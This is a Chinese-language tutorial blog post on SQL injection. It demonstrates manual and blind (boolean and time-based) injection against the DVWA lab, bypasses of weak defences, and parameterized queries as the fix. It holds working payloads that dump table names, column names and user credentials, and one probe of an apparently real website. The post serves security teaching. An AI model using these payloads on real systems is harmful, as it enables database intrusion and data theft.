---
title: Have Fun with SQL Injection
category: Sec
---

## Have Fun with SQL Injection

### 前言

注入攻击是 Web 安全领域中一种最为常见的攻击方式。针对`HTML`，有`XSS`跨站脚本攻击；针对数据库，有`SQL注入`攻击。注入攻击的本质，是把用户输入的数据当做代码执行。这里又两个关键条件，第一个是**用户能够控制输入**；第二个是**原本程序要执行的代码，拼接了用户输入的数据**。

`SQL注入`的基本原理及形式如下：

在一个 PHP 动态网页源码中有类似下面的源码：

{% highlight php %}
$conn = mysql_connect("localhost", "username", "password");

$query = "SELECT * FROM Products WHERE Price < '$_GET["val"]' " .
	"ORDER BY ProductDescription";

$result = mysql_query($query);

while($row = mysql_fetch_array($result, MYSQL_ASSOC)){
	echo "Descript: {$row['ProductDescription']} <br>" .
    	 "Product ID: {$row['ProductID']} <br>" .
         "Price: {$row['Price']} <br><br>";
}
{% endhighlight %}

那么如果用户提交的`val`的内容为：

```
100' or '1'='1
```

那么上面的查询语句实际为：

```
SELECT * FROM Products WHERE Price < '100' or '1'='1'
	ORDER BY ProductDescription;
```

这将返回所有的`Products`，不是网站的本意。这就是`SQL注入`。

`SQL注入`不仅仅发生在 Web 应用中，凡是使用到数据库的应用均存在`SQL注入`的风险。我们后面多采用 Web 应用进行展示，这是因为它的注入过程能够在浏览器上直观地显示出来，而其他如 Android 应用程序之类需要手动构造协议包去实现。

所有包含用户交互的地方均可能发生`SQL注入`。`GET`请求中，注入往往可能发生在`URL`后面；`POST`请求中，注入可能不那么可见，而是在`HTTP`报文中；另外，`cookie`那一项也经常是注入的发生点。

在本文中，我将按照下面的要点组织文章：

- 手工注入
- 手工注入（盲注）

在未特别声明的情况下，后文测试对象均为`DVWA`，使用`MySQL`作为数据库。

### 声明

**本文涉及到的知识、技术仅供学习、研究使用。请遵守所在国家、地区的相关法律；请勿非法入侵他人计算机。你已经被警告！**

**Knowledge and technique related in this paper are only for learning and study. Please observe relevant laws in your country or region. Please DO NOT penetrate other's device illegally. You have been warned!**

### SQL Injection

#### 简介

在**服务器开启错误回显**的情况下，我们优先使用正常的手工注入方法。手工注入往往按照如下步骤进行：

1. 判断是否存在注入，注入是字符型还是数字型
2. 猜解SQL查询语句中的字段数
3. 确定显示的字段顺序
4. 获取当前数据库名
5. 获取数据库中的表
6. 获取表中的字段名
7. 下载数据

后面所有演示基于`GET`请求，这样的演示比较直观。URL 的形式如下：

```
http://xxx.xxx.xxx/.../?id=1
```

即，注入点为`id`参数。

当正常输入`id=1`查询时，可以得到正常的返回结果。如下：

![]({{ site.url }}/images/sql-injection/normal0.png)

注：在尝试注入的过程中，有时可以加上`limit N`这样的操作来限制显示结果，防止由于一次查询过多内容而给服务器带来较大负担或触发防火墙报警。

#### 判断是否存在注入，注入是字符型还是数字型

输入`1 and 1=2`，返回如下所示：

![]({{ site.url }}/images/sql-injection/normal1.png)

依然返回一条结果。这说明存在两种可能：

- 参数不是整形
- 不存在注入

排除整形，下面尝试字符型。输入`1' and '1'='2`，返回如下所示：

![]({{ site.url }}/images/sql-injection/normal2.png)

查询结果竟然为空。继续，输入`1' or '1'='1`，返回如下所示：

![]({{ site.url }}/images/sql-injection/normal3.png)

返回了多个结果。说明存在字符注入。

#### 猜解SQL查询语句中的字段数

输入`1' or 1=1 order by 1 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/normal4.png)

输入`1' or 1=1 order by 2 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/normal5.png)

输入`1' or 1=1 order by 3 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/normal6.png)

这说明当前查询语句涉及的表中只有两个字段。

另外，也可以通过

```
1' or 1=1 union select 1 #
1' or 1=1 union select 1,2 #
1' or 1=1 union select 1,2,3 #
```

来猜测字段数。

#### 确定显示的字段顺序

其实我们上面的测试已经得到了结果。显示的先是`First name`，然后是`Surname`。如果网站开发者没有刻意将查询结果和动态语言显示的顺序打乱，那么可以猜测查询语句类似下面这样：

```
SELECT FirstName, Surname FROM xxx WHERE ID='$id';
```

#### 获取当前数据库名

我们已经知道了字段个数，所以一切变得简单许多。

输入`1' union select 1,database() #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/normal7.png)

可以看到，当前数据库名为`dvwa`。

#### 获取数据库中的表

**背景知识一**

`information_schema`是`MySQL`自带的数据库，用来访问数据库元数据。它和 Linux 上的`/proc`类似，是虚拟的数据库，实际并不存在，只是一些视图（`views`）。

```
mysql> use information_schema;
mysql> show tables;
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| ...                                   |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| ...                                   |
+---------------------------------------+
40 rows in set (0.00 sec)
```

其中`TABLES`存储了数据库中所有表的元数据。

**背景知识二**

`MySQL`中有一个函数`group_concat()`，能够把查询到的多行记录合并为一个字符串返回，字符串之间默认以逗号分隔。

**Let's go!**

我们现在希望获得当前使用的`dvwa`数据库中有多少张表。输入

```
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
```

返回如下所示：

![]({{ site.url }}/images/sql-injection/normal8.png)

可以看到，当前数据库有两张表`guestbook`和`users`。

#### 获取表中的字段名

有了上一步中的背景知识，这一步就很好理解：

```
1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #
```

返回如下所示：

![]({{ site.url }}/images/sql-injection/normal9.png)

可以看到，字段分别为

```
user_id, first_name, last_name,
user, password, avatar,
last_login, failed_login
```

#### 下载数据

之前所作的所有准备都是为了这一阶段。结合之前的信息，构造

```
1' union select 1,group_concat(user_id, first_name, last_name, user, password, avatar, last_login, failed_login) from users #
```

返回如下所示：

![]({{ site.url }}/images/sql-injection/normal10.png)

#### 攻防升级

前面的讨论和测试基于 PHP 源码中的查询语句如下：

```
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

只有如上简单的一句话。并且，前端是文本框输入的方式。

###### 防御升级一

前端改为下拉菜单方式+POST请求：

![]({{ site.url }}/images/sql-injection/normal11.png)

**绕过方法**

所有前端的限制都是不可靠的，因为攻击者可以自己构造包。所以仅仅通过抓包改包我们就能够轻松绕过下拉菜单的限制。

下面使用 FireFox 的插件`Tamper Data`做演示。

点击`Submit`按钮，触发`Tamper Data`：

![]({{ site.url }}/images/sql-injection/normal12.png)

选择`Tamper`后便可以修改包。我们按照如下修改：

![]({{ site.url }}/images/sql-injection/normal13.png)

###### 防御升级二

后端相关代码变为：

```
$id = mysql_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

**背景知识**

`mysql_real_escape_string`的作用是转义 SQL 语句字符串中的特殊字符。下列字符将受到影响：

```
\x00
\n
\r
\
'
"
\x1a
```

**绕过方法**

我们可以通过十六进制的方式来使用单引号：

```
1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #
```

###### 防御升级三

限制查询结果数：

```
$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

**绕过方法**

其实之前已经绕过这种防御了，直接用`#`注释掉即可。

###### 防御升级三

```
// Get input
$id = $_GET[ 'id' ];

// Was a number entered?
if(is_numeric( $id )) {
    // Check the database
    $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
    $data->bindParam( ':id', $id, PDO::PARAM_INT );
    $data->execute();
    $row = $data->fetch();

    // Make sure only 1 result is returned
    if( $data->rowCount() == 1 ) {
        // Get values
        $first = $row[ 'first_name' ];
        $last  = $row[ 'last_name' ];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
```

无法绕过。上面的代码采用了`PDO (PHP Data Object)`技术，将代码和数据明显区分开来，查询语句是开发人员预先设定好的，用户输入只能够被当做数据处理。这就是所谓`参数化查询`。另外，又限制了只有当查询结果数为 1 时才输出，有效防止了数据泄露。

### SQL Injection (Blind)

#### 简介

盲注与一般注入的区别在于，一般注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

手工盲注的过程就像是与一个机器人聊天，机器人只会回答“是”或“不是”。因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a”。通过这种机械的询问，最终获得你想要的数据。

手工盲注看起来有些费力，但是结合脚本一起来跑，还是很有效率的。

盲注类型：

- 基于布尔的盲注
- 基于时间的盲注
- 基于报错的盲注

后面，我将介绍**基于布尔**和**基于时间**的盲注。

盲注的基本步骤如下：

- 判断是否存在注入，注入是字符型还是数字型
- 猜解当前数据库名
- 猜解数据库中的表名
- 猜解表中的字段名
- 猜解数据

可以对比一下盲注的步骤与一般注入的步骤的异同。为什么要猜解呢？因为盲注遇到的场景往往是只知道“是”和“否”的：

{% highlight php %}
// Check database
$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid );
// Get results
$num = @mysqli_num_rows( $result );
if( $num > 0 ) {
    // Feedback for end user
    echo '<pre>User ID exists in the database.</pre>';
}
else {
    // User wasn't found, so the page wasn't!
    header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

    // Feedback for end user
    echo '<pre>User ID is MISSING from the database.</pre>';
}
{% endhighlight %}

当然，没有任何过滤，代码是存在漏洞的。

#### 基于布尔：判断是否存在注入，注入是字符型还是数字型

输入`1`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind0.png)

输入`1' and 1=2 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind1.png)

输入`1' and 1=1 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind2.png)

可以确认存在字符型注入。

#### 基于布尔：猜解当前数据库名

首先猜解数据库名的长度：

`1' and length(database())=1 #`

![]({{ site.url }}/images/sql-injection/blind1.png)

`1' and length(database())=2 #`

![]({{ site.url }}/images/sql-injection/blind1.png)

`1' and length(database())=3 #`

![]({{ site.url }}/images/sql-injection/blind1.png)

`1' and length(database())=4 #`

![]({{ site.url }}/images/sql-injection/blind0.png)

说明表名长度为 4。

接下来要猜解数据库名。我们知道，数据库名一定是由`ASCII码`组成的，所以在这个范围内使用二分法猜解。每次猜解一个字符。从第一个开始。

**背景知识**

`substring(string string,num start,num length)`返回参数 1 指定的字符串中参数 2 指定位置起参数 3 个字符。

`ascii(char)`返回字符的`ASCII码`。

输入`1' and ascii(substr(database(), 1, 1)) > ascii('a') #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind0.png)

输入`1' and ascii(substr(database(), 1, 1)) < ascii('z') #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind0.png)

输入`1' and ascii(substr(database(), 1, 1)) < ascii('z') #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind0.png)

输入`1' and ascii(substr(database(), 1, 1)) < ascii('m') #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind0.png)

输入`1' and ascii(substr(database(), 1, 1)) < ascii('g') #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind0.png)

输入`1' and ascii(substr(database(), 1, 1)) < ascii('d') #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind1.png)

输入`1' and ascii(substr(database(), 1, 1)) > ascii('d') #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind1.png)

这说明数据库名第一个字符是`d`。利用同样方法，分别代入`substr(database(), 2, 1)`/`substr(database(), 3, 1)`/`substr(database(), 4, 1)`，最终得到数据库名为`dvwa`。

#### 基于布尔：猜解数据库中的表名

首先猜解数据库中表的数量。

输入`1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind1.png)

输入`1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind0.png)

说明数据库中有两个表，接着挨个猜解表名。

先猜解第一个表表名的长度：

输入`1' and length((select table_name from information_schema.tables where table_schema=database() limit 0, 1))=1 #`，返回如下所示：

![]({{ site.url }}/images/sql-injection/blind1.png)

直到输入`1' and length((select table_name from information_schema.tables where table_schema=database() limit 0, 1))=9 #`时，才显示存在。所以第一个表表名长度为 9。

同理可得第二个表表名长度为 5。

接着就是使用上一步中的二分法猜测表名。

最终可以得到两个表表名分别为`guestbook`和`users`。

#### 基于布尔：猜解表中的字段名

使用类似的方法，猜解表中字段数量：

```1' and (select count(column_name) from information_schema.columns where table_name='users' and table_schema=database()) = 1 #```

最终可得`users`表有 8 个字段。

接着就是使用二分法挨个猜解字段名。

#### 基于布尔：猜解数据

同样，使用二分法，猜解数据（无论是自制还是用诸如`sqlmap`之类，这一步还是使用工具吧，手注太累了。不过著名如`sqlmap`的工具可能会被针对性的防护措施欺骗，所以有条件的话还是自己写工具）。

#### 基于时间：判断是否存在注入，注入是字符型还是数字型

**背景知识**

`IF(Condition,A,B)` 当`Condition`为`TRUE`时，返回`A`；当`Condition`为`FALSE`时，返回`B`。

输入`1 and sleep(5) #`，可以发现网页很快返回，没有明显延迟；  
输入`1' and sleep(5) #`，可以发现大概过了 5 秒，网页才加载完毕。说明是字符型注入。

#### 基于时间：猜解当前数据库名

首先猜解数据库名的长度：

输入`1' and if(length(database())=1, sleep(5), 1) #`，无明显延迟；  
输入`1' and if(length(database())=4, sleep(5), 1) #`，可以发现大概延迟 5 秒，说明数据库名长度为 4。

同理使用类似的方法，配合`if()`和`sleep()`可以猜解出剩余部分。不过使用基于时间的盲注耗时可能很长。另外，如果服务器对查询结果为空的语句主动加上`sleep`，那么将使基于时间的盲注的准确性受到影响

**拓展-版本探测**

下面对一个网站进行测试。我们可以通过盲注来获得版本信息：

![]({{ site.url }}/images/sql-injection/sqlinjeciton2.png)

![]({{ site.url }}/images/sql-injection/sqlinjeciton3.png)

上面两张图片说明该网站使用的数据库主版本为`5`。

### 结语

事实上，很大一部分攻击方法都属于注入攻击的范畴。不止`XSS`和`SQL注入`，缓冲区溢出这一经典攻击手法也是注入的一种。只有存在交互，才会有攻击的可能。

发展到今天，尽管各种`WAF`的过滤规则越来越复杂，但是`SQL注入`也变得越来越高级。它依然是一种需要被安全人员认真对待的攻击手法。我们需要看到的是，今天数据的重要性已经超越以往，而且仍在增加。`SQL注入`恰恰是最流行的盗取数据的方式。

通过前面对于“一般注入”和“盲注”的探讨，我们可以看到，行之有效的防御措施已经存在，即参数化查询。“白名单”往往比“黑名单”更有效，因为“黑名单”总会被绕过。所以，安全问题又回到了**人**身上。**人**是最大的漏洞。只有开发人员具备足够的安全意识和安全编码技能，才能使得这类攻击越来越少发生。

### 参考资料

- 《白帽子讲Web安全》 吴翰清
- 《SQL注入攻击与防御》 Justin Clarke
- [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)]({{ site.url }}/images/sql-injection/http://www.freebuf.com/articles/web/120985.html)
- [新手指南：DVWA-1.9全级别教程之SQL Injection]({{ site.url }}/images/sql-injection/http://www.freebuf.com/articles/web/120747.html)